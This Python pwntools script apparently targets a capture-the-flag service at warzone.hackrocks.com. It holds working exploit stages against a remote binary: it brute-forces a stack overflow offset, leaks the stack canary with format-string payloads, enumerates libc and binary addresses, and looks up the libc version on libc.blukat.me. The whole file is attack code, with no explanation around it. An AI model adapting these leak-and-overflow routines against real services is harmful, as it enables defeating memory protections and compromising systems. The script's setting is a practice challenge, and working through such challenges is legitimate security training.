from pwn import *
import requests

ip = "warzone.hackrocks.com"
port = 7772
gadget = 0x12db

def remove_dup(a):
   i = 0
   while i < len(a):
      j = i + 1
      while j < len(a):
         if a[i] == a[j]:
            del a[j]
         else:
            j += 1
      i += 1

def brute_offset():
	x = 1
	offset = 0
	while True:
		print("[!] Testing offset: " + str(x))
		p = remote(ip, port)
		p.recvuntil(b'tell me, what did you see?:')
		p.sendline(b'a')
		p.recvuntil(b'please, give me a feedback:')
		p.sendline(b'a'*x)
		try:
			p.recv()
			p.recv()
			try:
				leaks = p.recv()
				leaks = leaks.decode('utf-8')
				if 'stack smashing detected' in leaks:
					print("offset overflow: "+ str(x-1))
					offset = x-1
					break
				else:
					p.close()
					pass
			except:
				x += 1
				p.close()
		except:
			p.close()
			pass
	return offset


def find_canary_format():
	x = 0
	fixed_payload = ""
	while True:
		p = remote(ip, port)
		p.recvuntil(b'tell me, what did you see?:')
		payload = f"%{str(x)}$lx"
		p.sendline(payload.encode())
		try:
			p.recv()
			p.recv()
			leaks = p.recv()
			p.close()
			leaks = leaks.decode('utf-8')
			leaks = leaks.split(' ')
			#print(leaks[0])
			#print(len(leaks[0]))
			#print(leaks[0][14::])
			if len(leaks[0]) == 16 and leaks[0][14::] == '00':
				print("[+] Found canary: 0x"+leaks[0])
				print("[+] Canary leaking payload: " + payload)
				fixed_payload = payload
				break
			else:
				x += 1
		except:
			pass
	return fixed_payload

def enumerate_libc(offset):
	x = 0
	fixed_payload = []
	possible_leaked_libc = []
	while x < offset:
		print(f"iterate {str(x)}")
		p = remote(ip, port)
		p.recvuntil(b'tell me, what did you see?:')
		payload = f"%{str(x)}$lx"
		p.sendline(payload.encode())
		try:
			p.recv()
			p.recv()
			leaks = p.recv()
			p.close()
			leaks = leaks.decode('utf-8')
			leaks = leaks.split(' ')
			if leaks[0][0:2] == '7f' and len(leaks[0]) == 12:
				#print(f"[!] Payload {payload} with possible libc leak: {leaks[0]}")
				#print(f"[!] Check {leaks[0][9::]} for libc_start_main_ret in blukat")
				#unfixed_payload.append(payload)
				#possible_leaked_libc.append(leaks[0])
				data = requests.get(f"https://libc.blukat.me/?q=__libc_start_main_ret%3A{leaks[0][9::]}")
				if "Not found" in data.text:
					pass
				else:
					if payload not in fixed_payload:
						print(f"[!] Payload {payload} has 70% possibilities of libc leak: {leaks[0]}")
						fixed_payload.append(payload)
					else:
						pass
			else:
				pass
			x += 1
		except:
			pass
	print("enumerating libc dones")
	remove_dup(fixed_payload)
	return fixed_payload

def enumerate_binary(offset):
	x = 0
	while x < offset:
		#print(f"iterate {str(x)}")
		p = remote(ip, port)
		p.recvuntil(b'tell me, what did you see?:')
		payload = f"%{str(x)}$lx"
		p.sendline(payload.encode())
		try:
			p.recv()
			p.recv()
			leaks = p.recv()
			p.close()
			leaks = leaks.decode('utf-8')
			leaks = leaks.split(' ')
			if leaks[0][0:1] == '5' and len(leaks[0]) == 12:
				print(f"[!] Binary payload {payload} with response {leaks[0]} and offset 0x1{str(leaks[0][9::])}")
				x += 1
			else:
				pass
				x += 1
		except:
			pass
offset = brute_offset()
canary_payload = find_canary_format()
libc_payload = enumerate_libc(offset)
print("[+] overflow offset at " + str(offset))
print("[+] canary payload " + canary_payload)
print("[+] libc leaking payload")
print(libc_payload)
enumerate_binary(offset)
